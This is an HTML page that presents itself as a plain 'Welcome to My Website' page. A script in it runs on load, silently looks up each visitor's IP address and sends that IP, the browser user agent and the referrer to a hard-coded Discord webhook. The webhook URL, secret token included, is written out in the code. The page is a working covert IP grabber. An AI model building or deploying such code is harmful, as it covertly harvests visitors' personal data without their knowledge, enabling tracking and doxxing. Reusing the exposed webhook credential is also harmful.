<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Info</title>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <script>
        // Function to get visitor's IP address
        async function getVisitorInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return 'Unknown IP';
            }
        }

        // Function to send info to Discord webhook
        async function sendToDiscord(ip) {
            const webhookUrl = 'https://discord.com/api/webhooks/1303101741839159337/nbA-IrRRRbTWQMy1NGH_OtfnTCSZhHM8flJG7BhgnYXjhvCGykPTBjS3XlGlOFwHkO1D';
            const message = {
                content: `New visitor info:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferrer: ${document.referrer || 'Direct'}`,
                username: 'Neutral Site'
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                console.log('Webhook sent successfully');
            } catch (error) {
                console.error('Error sending webhook:', error);
            }
        }

        // On page load, get visitor info and send to Discord
        window.onload = async function() {
            const ip = await getVisitorInfo();
            sendToDiscord(ip);
        };
    </script>
</body>
</html>
